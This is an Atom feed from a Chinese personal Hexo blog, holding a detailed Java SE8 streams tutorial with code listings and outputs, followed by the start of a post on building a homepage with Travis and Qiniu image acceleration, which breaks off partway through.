<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liebes 的个人日志</title>
  
  <subtitle>心比天高，命比纸薄。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.liebes.top/"/>
  <updated>2019-08-04T12:56:30.278Z</updated>
  <id>https://blog.liebes.top/</id>
  
  <author>
    <name>Liebes</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java SE8 的流库</title>
    <link href="https://blog.liebes.top/2018/05/03/learn-java-1/"/>
    <id>https://blog.liebes.top/2018/05/03/learn-java-1/</id>
    <published>2018-05-03T16:27:17.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>JAVA中，流旨在创建一种关注“做什么而非怎么做”的设计理念，我们无需关心流内具体的实现，而把更多精力放在流需要做什么上面。例如我们需要计算一个字符串数组中，长度大于10的有多少，参见下面的代码清单：</p><pre><code class="java">public static void main(String args[]) throws IOException{    String contents = new String(Files.readAllBytes(Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;)), StandardCharsets.UTF_8);    List&lt;String&gt; words = Arrays.asList(contents.split(&quot;\\PL+&quot;));    long count = 0;    // 怎么做    for(String s : words){        if(s.length() &gt; 10) count++;    }    System.out.println(count);    // 做什么    count = words.stream().filter(s -&gt; s.length() &gt; 10).count();    System.out.println(count);    count = words.parallelStream().filter(s -&gt; s.length() &gt; 10).count();    System.out.println(count);}</code></pre><p>第一种方式，是很容易想到的一种，循环遍历计算的一种方法，而第二种则是使用了流的概念。</p><p>Stream，流。我们可以理解为水流，所有的流操作都是惰性的，即当你访问数据的时候，相关操作才会执行。我们在水流的行进方向设置我们想要完成的操作，当水流经过时，就会执行相关的操作。例如上面的 <code>count = words.stream().filter(s -&gt; s.length() &gt; 10).count();</code> 这一句，filter方法可以理解为一个水阀，控制水流。</p><h2 id="流的创建方式"><a href="#流的创建方式" class="headerlink" title="流的创建方式"></a>流的创建方式</h2><hr><p>流的创建方式有很多种，可以使用 Stream 提供的工厂方法，也可以使用集合的转换方法。</p><p>当然流可以产生子流，两个流也可以合并成一个流，我们也可以通过某些操作，逐一处理流内的元素，例如 <code>map flatMap filter</code> 等方法。</p><p>下面是创建流的程序清单</p><pre><code class="Java">import java.io.IOException;import java.math.BigInteger;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.List;import java.util.regex.Pattern;import java.util.stream.Collectors;import java.util.stream.Stream;public class Main {    // 输出流    public static &lt;T&gt; void show(String title, Stream&lt;T&gt; stream){        final int SIZE = 10;        List&lt;T&gt; firstElements = stream.limit(SIZE + 1).collect(Collectors.toList());        System.out.println(title + &quot;: &quot;);        for(int i = 0; i &lt; firstElements.size(); i ++){            if(i &gt; 0) System.out.print(&quot;, &quot;);            if(i &lt; SIZE)                System.out.print(firstElements.get(i));            else                System.out.println(&quot;...&quot;);        }        System.out.println();    }    public static void main(String args[]) throws IOException{        Path path = Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;);        String contents = new String(Files.readAllBytes(path), StandardCharsets.UTF_8);        // 通过 Stream.of ，使用自负转数组获取流        Stream&lt;String&gt; words = Stream.of(contents.split(&quot;\\PL+&quot;));        show(&quot;words&quot;, words);        // 通过 Stream.of ，使用可变长参数        Stream&lt;String&gt; song = Stream.of(&quot;gently&quot;, &quot;down&quot;, &quot;the&quot;, &quot;stream&quot;);        show(&quot;song&quot;, song);        // 空流        Stream&lt;String&gt; silence = Stream.empty();        show(&quot;silence&quot;, silence);        // 使用 lemada        Stream&lt;String&gt; echos = Stream.generate(() -&gt; &quot;Echo&quot;);        show(&quot;echos&quot;, echos);        Stream&lt;Double&gt; randoms = Stream.generate(Math::random);        show(&quot;randoms&quot;, randoms);        Stream&lt;BigInteger&gt; integers = Stream.iterate(BigInteger.ONE, n-&gt;n.add(BigInteger.ONE));        show(&quot;integers&quot;, integers);        Stream&lt;String&gt; wordsAnotherWay = Pattern.compile(&quot;\\PL+&quot;).splitAsStream(contents);        show(&quot;wordsAnotherWay&quot;, wordsAnotherWay);        try(Stream&lt;String&gt; lines = Files.lines(path, StandardCharsets.UTF_8)){            show(&quot;lines&quot;, lines);        }    }}</code></pre><h2 id="终结操作-amp-Optional-API-使用方式"><a href="#终结操作-amp-Optional-API-使用方式" class="headerlink" title="终结操作 &amp; Optional API 使用方式"></a>终结操作 &amp; Optional API 使用方式</h2><hr><p>类似 <code>filter map</code> 等方法，会生成一个新的子流，也就是一个中间处理，流经过这些方法，数据做了处理，返回仍然是流。这种方法为非终结方法。</p><p>类似 <code>count</code> 等方法，会返回一个具体的结果，这种操作为非终结操作。</p><p>非终结操作可能带来的问题，就是没有满足条件的元素，比如 <code>findFirst</code> 方法，如果没有满足条件的元素，则可能导致空指针异常。</p><p>Optional 类是一种包装类，他存在的意义在于避免空指针异常的问题（当然这需要正确的使用）。</p><p>程序清单如下</p><pre><code class="java">import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.*;public class Main {    // 返回一个包装 1/x 的Optional类    public static Optional&lt;Double&gt; inverse(Double x){        return x == 0 ? Optional.empty() : Optional.of(1 / x);    }    // 返回一个包装 √x 的Optional类    public static Optional&lt;Double&gt; squareRoot(Double x){        return x &lt; 0 ? Optional.empty() : Optional.of(Math.sqrt(x));    }    public static void main(String args[]) throws IOException{        Path path = Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;);        String contents = new String(Files.readAllBytes(path), StandardCharsets.UTF_8);        List&lt;String&gt; wordList = Arrays.asList(contents.split(&quot;\\PL+&quot;));        Optional&lt;String&gt; optionalValue = wordList.stream()                .filter(s -&gt; s.contains(&quot;index&quot;))                .findFirst();        // orElse() 提供包装值不存在的时候的默认值        System.out.println(optionalValue.orElse(&quot;no word&quot;) + &quot; contains index&quot;);        Optional&lt;String&gt; optionalString = Optional.empty();        String result = optionalString.orElse(&quot;N/A&quot;);        System.out.println(&quot;result: &quot; + result);        result = optionalString.orElseGet(() -&gt; Locale.getDefault().getDisplayName());        System.out.println(result);        try{            result = optionalString.orElseThrow(IllegalStateException::new);            System.out.println(&quot;result: &quot; + result);        }catch (Throwable e){            e.printStackTrace();        }        optionalValue = wordList.stream()                .filter(s -&gt; s.contains(&quot;a&quot;))                .findFirst();        // ifPresent() 当存在的时候才会执行里面的函数        optionalValue.ifPresent(s -&gt; System.out.println(s + &quot; contains a&quot;));        Set&lt;String&gt; results = new HashSet&lt;&gt;();        optionalValue.ifPresent(results::add);        Optional&lt;Boolean&gt; added = optionalValue.map(results::add);        System.out.println(added);        System.out.println(inverse(4.0).flatMap(Main::squareRoot));        System.out.println(inverse(-1.0).flatMap(Main::squareRoot));        System.out.println(inverse(0.0).flatMap(Main::squareRoot));        Optional&lt;Double&gt; result2 = Optional.of(-4.0)                .flatMap(Main::inverse).flatMap(Main::squareRoot);        System.out.println(result2);    }}// outputindex contains indexresult: N/AEnglish (United States)java.lang.IllegalStateException    at java.util.Optional.orElseThrow(Optional.java:290)    at Main.main(Main.java:34)app contains aOptional[false]Optional[0.5]Optional.emptyOptional.emptyOptional.empty</code></pre><h2 id="取出元素"><a href="#取出元素" class="headerlink" title="取出元素"></a>取出元素</h2><hr><p>取出流中的元素有两种方法，一种是使用 <code>toArray</code> 方法，转换成数组，另一种是使用 <code>iterator</code> 遍历。</p><p>Stream 提供了 collect 方法，通过传入的工厂方法，初始化元素。Collectors 类中提供了许多创建容器的工厂方法。</p><pre><code class="Java">import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;import java.util.stream.Collectors;import java.util.stream.Stream;public class Main {    // 将每一个元素中的特定字符过滤掉，返回流    public static Stream&lt;String&gt; noVowels() throws IOException{        String contents = new String(Files.readAllBytes(                Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;)),                StandardCharsets.UTF_8        );        List&lt;String&gt; wordList = Arrays.asList(contents.split(&quot;\\PL+&quot;));        Stream&lt;String&gt; words = wordList.stream();        return words.map(s -&gt; s.replaceAll(&quot;[aeiouAEIOU]&quot;, &quot;&quot;));    }    // 显示    public static &lt;T&gt; void show(String label, Set&lt;T&gt; set){        System.out.print(label + &quot;: &quot; + set.getClass().getName());        System.out.println(&quot;[&quot; +                set.stream().limit(10).map(Object::toString)                        .collect(Collectors.joining(&quot;, &quot;)) + &quot;]&quot;);    }    public static void main(String args[]) throws IOException{        Iterator&lt;Integer&gt; iter = Stream.iterate(0, n -&gt; n + 1).limit(10).iterator();        while(iter.hasNext()){            System.out.println(iter.next());        }        // 由于在运行时不能泛化数组，所以返回的类型是 Object[]        Object[] numbers = Stream.iterate(0, n -&gt; n + 1).limit(10).toArray();        System.out.println(&quot;Object array:&quot; + numbers);        try{            Integer number = (Integer) numbers[0];            System.out.println(&quot;number: &quot; + number);            System.out.println(&quot;The following statement throws an exception:&quot;);            Integer[] numbers2 = (Integer[]) numbers;        }        catch (ClassCastException e){            System.out.println(e);        }        // 生成特定类型的数组        Integer[] numbers3 = Stream.iterate(0, n -&gt; n + 1).limit(10).toArray(Integer[]::new);        System.out.println(&quot;Integer array: &quot; + numbers3);        // 使用 collect 方法        Set&lt;String&gt; noVowelSet = noVowels().collect(Collectors.toSet());        show(&quot;noVowelSet&quot;, noVowelSet);        TreeSet&lt;String&gt; noVowelTreeSet = noVowels().collect(                Collectors.toCollection(TreeSet::new)        );        show(&quot;noVowelTreeSet&quot;, noVowelTreeSet);        String result = noVowels().limit(10).collect(Collectors.joining());        System.out.println(&quot;joining: &quot; + result);        result = noVowels().limit(10).collect(Collectors.joining(&quot;, &quot;));        System.out.println(&quot;joining with commas: &quot; + result);        IntSummaryStatistics summary = noVowels().collect(Collectors.summarizingInt(String::length));        double averageWordLength = summary.getAverage();        double maxWordLength = summary.getMax();        System.out.println(&quot;Average word length: &quot; + averageWordLength);        System.out.println(&quot;Max word lengthL: &quot; + maxWordLength);        System.out.println(&quot;forEach: &quot;);        // forEach 接受一个闭包，类似 map 的用法        noVowels().limit(10).forEach(System.out::println);    }}</code></pre><h2 id="收集结果到映射表"><a href="#收集结果到映射表" class="headerlink" title="收集结果到映射表"></a>收集结果到映射表</h2><hr><p>有时我们需要把流中的结果收集到映射表中，例如获得一个 id -&gt; name 的一个映射表，此时可以使用 Collectors.toMap() 这个方法。</p><p>API 文档如下</p><blockquote><p>public static &lt;T,K,U,M extends Map&lt;K,U&gt;&gt; Collector&lt;T,?,M&gt; toMap(<br>    Function&lt;? super T,? extends K&gt; keyMapper,<br>    Function&lt;? super T,? extends U&gt; valueMapper,<br>    BinaryOperator<u> mergeFunction,<br>    Supplier<m> mapSupplier<br>)</m></u></p><p>Returns a <code>Collector</code> that accumulates elements into a <code>Map</code> whose keys and values are the result of applying the provided mapping functions to the input elements.</p><p>If the mapped keys contains duplicates (according to <a href="../../../java/lang/Object.html#equals-java.lang.Object-"><code>Object.equals(Object)</code></a>), the value mapping function is applied to each equal element, and the results are merged using the provided merging function. The <code>Map</code> is created by a provided supplier function.</p><ul><li><p>Type Parameters:</p><p><code>T</code> - the type of the input elements</p><p><code>K</code> - the output type of the key mapping function</p><p><code>U</code> - the output type of the value mapping function</p><p><code>M</code> - the type of the resulting <code>Map</code></p></li><li><p>Parameters:</p><p><code>keyMapper</code> - a mapping function to produce keys</p><p><code>valueMapper</code> - a mapping function to produce values</p><p><code>mergeFunction</code> - a merge function, used to resolve collisions between values associated with the same key, as supplied to <a href="../../../java/util/Map.html#merge-K-V-java.util.function.BiFunction-"><code>Map.merge(Object, Object, BiFunction)</code></a></p><p><code>mapSupplier</code> - a function which returns a new, empty <code>Map</code> into which the results will be inserted</p></li><li><p>Returns:</p><p>a <code>Collector</code> which collects elements into a <code>Map</code> whose keys are the result of applying a key mapping function to the input elements, and whose values are the result of applying a value mapping function to all input elements equal to the key and combining them using the merge function</p></li></ul></blockquote><p>其中后两个参数可以缺省。</p><p>前两个参数定义了 获取 <code>Key</code> 与 <code>Value</code> 的函数，当发生冲突的时候，则调用第三个参数进行merge，如果不定义，则点那个 Key 冲突则会抛出异常。</p><p>第四个参数定义了返回 <code>Map</code> 的具体类型，可以传入任何一个 <code>Map</code> 子类的 <code>Supplier</code>，例如 <code>TreeMap::new</code>。</p><pre><code class="java">import java.io.IOException;import java.util.*;import java.util.function.Function;import java.util.stream.Collectors;import java.util.stream.Stream;public class Main {    public static class Person{        private int id;        private String name;        public Person(int id, String name){            this.id = id;            this.name = name;        }        public int getId(){            return id;        }        public String getName(){            return name;        }        public String toString(){            return getClass().getName() + &quot;[id=&quot; + id + &quot;, name=&quot; + name;        }    }    public static Stream&lt;Person&gt; people(){        return Stream.of(new Person(1001, &quot;peter&quot;), new Person(1002, &quot;paul&quot;), new Person(1003, &quot;Mary&quot;));    }    public static void main(String args[]) throws IOException {        // 缺省后两个参数        Map&lt;Integer, String&gt; idToName = people().collect(                Collectors.toMap(Person::getId, Person::getName)        );        System.out.println(&quot;idToName: &quot; + idToName);        // ID -&gt; Person        Map&lt;Integer, Person&gt; idToPerson = people().collect(                Collectors.toMap(Person::getId, Function.identity())        );        System.out.println(&quot;idToPerson: &quot; + idToPerson.getClass().getName() + idToPerson);        // 当冲突的时候解决办法        idToPerson = people().collect(                Collectors.toMap(Person::getId, Function.identity(),                        (existingValue, newValue) -&gt; { throw new IllegalStateException(); },                        TreeMap::new)        );        System.out.println(&quot;idToPerson: &quot; + idToPerson.getClass().getName() + idToPerson);        Stream&lt;Locale&gt; locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, String&gt; languageNames = locales.collect(                Collectors.toMap(                        Locale::getDisplayName,                        Locale::getDisplayLanguage,                        (existingValue, newValue) -&gt; existingValue                )        );        System.out.println(&quot;languageNames: &quot; + languageNames);        locales = Stream.of(Locale.getAvailableLocales());        // 结果冲突保留所有 Value        Map&lt;String, Set&lt;String&gt;&gt; countryLanguageSets = locales.collect(                Collectors.toMap(                        Locale::getDisplayCountry,                        l -&gt; Collections.singleton(l.getDisplayLanguage()),                        (a, b) -&gt; {                            Set&lt;String&gt; union = new HashSet&lt;&gt;(a);                            union.addAll(b);                            return union;                        }                )        );        System.out.println(&quot;countryLanguageSets: &quot; + countryLanguageSets);    }}// outputidToName: {1001=peter, 1002=paul, 1003=Mary}idToPerson: java.util.HashMap{1001=Main$Person[id=1001, name=peter, 1002=Main$Person[id=1002, name=paul, 1003=Main$Person[id=1003, name=Mary}idToPerson: java.util.TreeMap{1001=Main$Person[id=1001, name=peter, 1002=Main$Person[id=1002, name=paul, 1003=Main$Person[id=1003, name=Mary}languageNames: {Japanese (Japan,JP)=Japanese, Ukrainian (Ukraine)=Ukrainian, =, ...countryLanguageSets: {=[, Italian, Slovak, Russian, Hebrew, Belarusian, Serbian, ...</code></pre><p>（有一些关于Supplier Function这些接口的使用，百度一下就懂了）</p><h2 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a>聚合操作</h2><hr><p>有时我们需要像数据库操作那样进行数据统计，需要用到一些聚合操作。例如统计每个省份的人数总和。</p><p>这里需要详细查看一下 <code>collect</code> 方法的API</p><blockquote><p><strong>collect</strong></p><p><code>&lt;R,A&gt; R collect(Collector&lt;? super T,A,R&gt; collector)</code></p><p>Performs a <a href>mutable reduction</a> operation on the elements of this stream using a <code>Collector</code>. A <code>Collector</code> encapsulates the functions used as arguments to <a href><code>collect(Supplier, BiConsumer, BiConsumer)</code></a>, allowing for reuse of collection strategies and composition of collect operations such as multiple-level grouping or partitioning.</p><p>If the stream is parallel, and the <code>Collector</code> is <a href><code>concurrent</code></a>, and either the stream is unordered or the collector is <a href><code>unordered</code></a>, then a concurrent reduction will be performed (see <a href><code>Collector</code></a> for details on concurrent reduction.)</p><p>This is a <a href>terminal operation</a>.</p><p>When executed in parallel, multiple intermediate results may be instantiated, populated, and merged so as to maintain isolation of mutable data structures. Therefore, even when executed in parallel with non-thread-safe data structures (such as <code>ArrayList</code>), no additional synchronization is needed for a parallel reduction.</p><p><strong>Type Parameters:</strong></p><p><code>R</code> - the type of the result</p><p><code>A</code> - the intermediate accumulation type of the <code>Collector</code></p><p><strong>Parameters:</strong></p><p><code>collector</code> - the <code>Collector</code> describing the reduction</p><p><strong>Returns:</strong></p><p>the result of the reduction</p></blockquote><p>collect 方法接受一个收集器，返回值由具体收集器来决定。传入收集器的参数为流中元素 T，R为收集器返回的类型。</p><p>聚集操作主要使用 groupingBy 方法，该方法接受一个 Function 接口类型的参数，以及一个下游收集器。下游收集器负责处理聚集后子元素的操作。</p><p>这里需要明确流的流向，参考下面的代码</p><p>聚集操作 -&gt; 每个key对应的子流由mapping收集器收集</p><p>-&gt; 将元素类型为 City 的流映射成 String -&gt; 子流由 maxBy 收集器收集</p><pre><code class="java">Map&lt;String, Optional&lt;String&gt;&gt; stateToLongestCityName = cities.collect(        groupingBy(                City::getState,                mapping(City::getName, maxBy(Comparator.comparing(String::length)))        ));</code></pre><p>下面是具体的程序清单</p><pre><code class="java">import java.io.IOException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;import java.util.stream.Collectors;import java.util.stream.Stream;import static java.util.stream.Collectors.*;public class Main {    public static class City{        private String name;        private String state;        private int population;        public City(String name, String state, int population) {            this.name = name;            this.state = state;            this.population = population;        }        public String getName() {            return name;        }        public String getState() {            return state;        }        public int getPopulation() {            return population;        }    }    public static Stream&lt;City&gt; readCities(String filename) throws IOException{        return Files.lines(Paths.get(filename)).map(l -&gt; l.split(&quot;, &quot;))                .map(a -&gt; new City(a[0], a[1], Integer.parseInt(a[2])));    }    public static void main(String args[]) throws IOException{        Stream&lt;Locale&gt; locales = Stream.of(Locale.getAvailableLocales());        // 使用 toSet 收集器，将结果转换成SET        locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, Set&lt;Locale&gt;&gt; countryToLocaleSet = locales.collect(                Collectors.groupingBy(Locale::getCountry, toSet())        );        System.out.println(&quot;countryToLocaleSet: &quot; + countryToLocaleSet);        // 使用 counting 收集器，讲结果转换成计数        locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, Long&gt; countryToLocalesCount = locales.collect(                Collectors.groupingBy(Locale::getCountry, counting())        );        System.out.println(&quot;countryToLocalesCount: &quot; + countryToLocalesCount);        // 累加和        Stream&lt;City&gt; cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, Integer&gt; stateToCityPopulation = cities.collect(                Collectors.groupingBy(City::getState, summingInt(City::getPopulation))        );        System.out.println(&quot;stateToCItyPopulation: &quot; + stateToCityPopulation);        // 求出最值        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, Optional&lt;String&gt;&gt; stateToLongestCityName = cities.collect(                groupingBy(                        City::getState,                        mapping(City::getName, maxBy(Comparator.comparing(String::length)))                )        );        System.out.println(&quot;stateToLongestCityName: &quot; + stateToLongestCityName);        locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, Set&lt;String&gt;&gt; countryToLanguages = locales.collect(                groupingBy(                        Locale::getDisplayCountry,                        mapping(Locale::getDisplayLanguage, toSet())                )        );        System.out.println(&quot;countryToLanguages: &quot; + countryToLanguages);        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, IntSummaryStatistics&gt; stateToCityPopulationSummary = cities.collect(                groupingBy(                        City::getState, summarizingInt(City::getPopulation)                )        );        System.out.println(stateToCityPopulationSummary.get(&quot;liaoning&quot;));        // reducing 操作，第一个参数应该是默认的第一个元素，且当流为空时作为返回值        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, String&gt; stateToCityNames = cities.collect(                groupingBy(                        City::getState,                        reducing(&quot;&quot;, City::getName, (s, t) -&gt; s.length() == 0 ? t : s + &quot;, &quot; + t)                )        );        System.out.println(&quot;stateToCityName1: &quot; + stateToCityNames);        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        stateToCityNames = cities.collect(                groupingBy(                        City::getState,                        mapping(City::getName, joining(&quot;, &quot;))                )        );        System.out.println(&quot;stateToCityName2: &quot; + stateToCityNames);     }}// outputcountryToLocaleSet: {=[, in, sl, ...], DE=[de_DE], PR=[es_PR], HK=[zh_HK], TW=[zh_TW], PT=[pt_PT], HN=[es_HN], DK=[da_DK], LT=[lt_LT], LU=[de_LU, fr_LU], ...}countryToLocalesCount: {=46, DE=1, PR=1, HK=1, TW=1, HR=1, DO=1, UA=1, YE=1, LY=1, HU=1, QA=1, MA=1, DZ=1, ME=2, ID=1, ...}stateToCItyPopulation: {jilin=56, tianjin=20, beijing=200, liaoning=259, heilongjiang=70}stateToLongestCityName: {jilin=Optional[jilin], tianjin=Optional[tianjin], beijing=Optional[beijing], liaoning=Optional[shenyang], heilongjiang=Optional[haerbin]}countryToLanguages: {=[, Italian, Slovak, Russian, Hebrew, Belarusian, Serbian, German, Slovenian, Swedish, Turkish, Ukrainian, ...], Cyprus=[Greek], Sudan=[Arabic], Malaysia=[Malay], Paraguay=[Spanish], Portugal=[Portuguese], Oman=[Arabic], ...}IntSummaryStatistics{count=3, sum=259, min=10, average=86.333333, max=149}stateToCityName1: {jilin=jilin, tianjin=tianjin, beijing=beijing, liaoning=shenyang, yingkou, dalian, heilongjiang=haerbin, mohe}stateToCityName2: {jilin=jilin, tianjin=tianjin, beijing=beijing, liaoning=shenyang, yingkou, dalian, heilongjiang=haerbin, mohe}// cities.txtshenyang, liaoning, 100tianjin, tianjin, 20yingkou, liaoning, 10beijing, beijing, 200dalian, liaoning, 149jilin, jilin, 56haerbin, heilongjiang, 14mohe, heilongjiang, 56</code></pre><h2 id="约简操作-amp-初始数据流"><a href="#约简操作-amp-初始数据流" class="headerlink" title="约简操作 &amp; 初始数据流"></a>约简操作 &amp; 初始数据流</h2><p>约简操作是终结操作，用来将整个流约简为一个数据，比如求和操作。</p><blockquote><p><u> U reduce(U identity,<br>             BiFunction&lt;U,? super T,U&gt; accumulator,<br>             BinaryOperator<u> combiner)<br>Performs a reduction on the elements of this stream, using the provided identity, accumulation and combining functions. This is equivalent to:<br>     <strong>U result = identity;</strong><br>     <strong>for (T element : this stream)</strong><br>         <strong>result = accumulator.apply(result, element)</strong><br>     <strong>return result;</strong><br>but is not constrained to execute sequentially.<br>The <code>identity</code> value must be an identity for the combiner function. This means that for all <code>u</code>, <code>combiner(identity, u)</code> is equal to <code>u</code>. Additionally, the <code>combiner</code> function must be compatible with the <code>accumulator</code> function; for all <code>u</code> and <code>t</code>, the following must hold:</u></u></p><pre><code> combiner.apply(u, accumulator.apply(identity, t)) == accumulator.apply(u, t)</code></pre><p>This is a <a href>terminal operation</a>.</p></blockquote><p>reduce函数接收三个参数，第三个参数将并行操作的结果合并。因此要求第二个参数的二元操作满足交换律。</p><p>前面提到的流的操作都是针对 Object 类型，有时我们更需要一些包装了基本类型的流，例如 StringStream IntStream DoubleStream 等</p><p>下方是 IntSteam 相关的程序清单</p><pre><code class="java">import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.stream.Collectors;import java.util.stream.IntStream;import java.util.stream.Stream;public class Main {    public static void show(String title, IntStream stream){        final int SIZE = 10;        int[] firstElements = stream.limit(SIZE + 1).toArray();        System.out.print(title + &quot;: [&quot;);        int i;        for(i = 0; i &lt; SIZE &amp;&amp; i &lt; firstElements.length; i ++){            System.out.print(firstElements[i]);            if(i &lt; firstElements.length - 1)                System.out.print(&quot;, &quot;);        }        if(i &lt; firstElements.length)            System.out.print(&quot;...&quot;);        System.out.println(&quot;]&quot;);    }    public static void main(String args[]) throws IOException{        // 整数流        IntStream is1 = IntStream.generate(() -&gt; (int)(Math.random() * 100));        show(&quot;is1&quot;, is1);        // 左闭右开        IntStream is2 = IntStream.range(5, 10);        show(&quot;is2&quot;, is2);        // 左闭右闭        IntStream is3 = IntStream.rangeClosed(5, 10);        show(&quot;is3&quot;, is3);        String contents = new String(Files.readAllBytes(Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;)), StandardCharsets.UTF_8);        Stream&lt;String&gt; words = Stream.of(contents.split(&quot;\\PL+&quot;));        // 通过mapToInt方法转换成整数流        IntStream is4 = words.mapToInt(String::length);        show(&quot;is4&quot;, is4);        // 获取 Unicode 编码        String sentence = &quot;\uD835\uDD46 is the set of octonions.&quot;;        System.out.println(sentence);        IntStream codes = sentence.codePoints();        System.out.println(codes.mapToObj(c -&gt; String.format(&quot;%X&quot;, c)).collect(                Collectors.joining()        ));        // boxed 将 IntStream 重新变成包装 Integer 的 Stream        Stream&lt;Integer&gt; integers = IntStream.range(0, 100).boxed();        IntStream is5 = integers.mapToInt(Integer::intValue);        show(&quot;is5&quot;, is5);    }}// outputis1: [7, 61, 22, 99, 45, 81, 42, 84, 97, 82, ...]is2: [5, 6, 7, 8, 9]is3: [5, 6, 7, 8, 9, 10]is4: [3, 8, 3, 5, 3, 13, 4, 4, 3, 4, ...]𝕆 is the set of octonions.1D5462069732074686520736574206F66206F63746F6E696F6E732Eis5: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, ...]</code></pre><h2 id="并行流-Parallel-Stream"><a href="#并行流-Parallel-Stream" class="headerlink" title="并行流 Parallel Stream"></a>并行流 Parallel Stream</h2><p>TODO</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;JAVA中，流旨在创建一种关注“做什么而非怎么做”的设计理念，我们无需关心流内具体的实现，而把更多精力放在流需要做什么上面。例如我们需要计算一个字符串数组中，长度大于10的有多少，参见下面的代码清单：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;java&quot;&gt;public s
      
    
    </summary>
    
      <category term="JAVA学习笔记" scheme="https://blog.liebes.top/categories/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="java" scheme="https://blog.liebes.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>hexo 设置相册、主页并使用七牛云加速图片加载</title>
    <link href="https://blog.liebes.top/2018/02/07/front-qiniu/"/>
    <id>https://blog.liebes.top/2018/02/07/front-qiniu/</id>
    <published>2018-02-07T15:23:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>据换完博客主题之后也有一段时间了，但总觉得哪里不对的样子，别人家都是主页和博客分开的，或者把博客放在主页的子目录下，而自己的却只有一个博客，反正自己也有域名，为什么不整个单独的主页出来呢。</p><p>这篇文章记录了海痴是如何在 google 上扒模版，如何利用 travis 来将博客的内容同步到主页上，又如何与某涛互相比较，解决图片加载慢的问题。</p><p>我们可以看看最终的效果：<a href="https://www.liebes.top" target="_blank" rel="noopener">https://www.liebes.top</a></p><p>在一切开始之前，海痴已经准备好了用 hexo 搭建起来的博客，一个自己的域名，以及使用 travis 将博客部署到自己的服务器的脚本。可以参见上一篇博客：<a href="https://blog.liebes.top/2018/01/25/hexo-material/">Hexo 更换 materail 主题，使用 Travis 持续集成</a></p><h2 id="一份靠谱的主页模板"><a href="#一份靠谱的主页模板" class="headerlink" title="一份靠谱的主页模板"></a>一份靠谱的主页模板</h2><p>关于如何找到一份高端上档次的主题模板，大家可以各显神通，当然，最快的还是 google 上搜一下：“主页 模板 bootstrap”，请一定加上 bootstrap 这个关键字，因为经过实践，这样搜出的结果最靠谱。</p><p>准备好之后，就可以将模板文件放在博客的根目录下，随便起个名字，就像这样：</p><pre><code>├── _config.yml├── db.json├── liebes.top &lt;- 这个是模板文件├── liebes.top.py &lt;- 这个是之后会用到的脚本文件├── node_modules├── package-lock.json├── package.json├── public├── pyyaml├── scaffolds├── source├── themes└── travis.enc</code></pre><p>根据你的需要来修改你的主页模板。</p><h2 id="动态获取博客内容，嵌入主页中"><a href="#动态获取博客内容，嵌入主页中" class="headerlink" title="动态获取博客内容，嵌入主页中"></a>动态获取博客内容，嵌入主页中</h2><p>如果你希望你的主页上显示一些你的个人动态，你就要动一番手脚了。</p><p>一个简单的办法，就是使用 php 做个后台支持，这并不难。</p><p>海痴希望将自己最近写的博客显示在主页上，同时显示一些相册里面的照片。一个简单的思路，就是读取博客目录中的静态文件，提取内容，找出时间相近的部分，使用脚本文件对 html 进行替换。</p><p>于是我的 <code>index.html</code> 文件就变成了这个样子：</p><pre><code class="Html">&lt;section class=&quot;swag text-center&quot;&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div class=&quot;col-md-8 col-md-offset-2&quot;&gt;        &lt;h1&gt;我共写了 {count} 篇博客&lt;span&gt;记录生活，记录点滴&lt;/span&gt;&lt;/h1&gt;        &lt;a href=&quot;#portfolio&quot; class=&quot;down-arrow-btn&quot;&gt;&lt;i class=&quot;fa fa-chevron-down&quot;&gt;&lt;/i&gt;&lt;/a&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/section&gt;&lt;section class=&quot;portfolio text-center section-padding&quot; id=&quot;portfolio&quot;&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div id=&quot;servicesSlider&quot; class=&quot;hidden-sm hidden-xs&quot;&gt;        &lt;ul class=&quot;slides&quot;&gt;          {articles}        &lt;/ul&gt;      &lt;/div&gt;        &lt;div id=&quot;servicesSlider2&quot; class=&quot;hidden-md hidden-lg&quot;&gt;            &lt;ul class=&quot;slides&quot;&gt;                {articles2} &lt;- 这个是适配小屏幕的            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/section&gt;</code></pre><p>我将需要替换的部分用 <code>{var}</code> 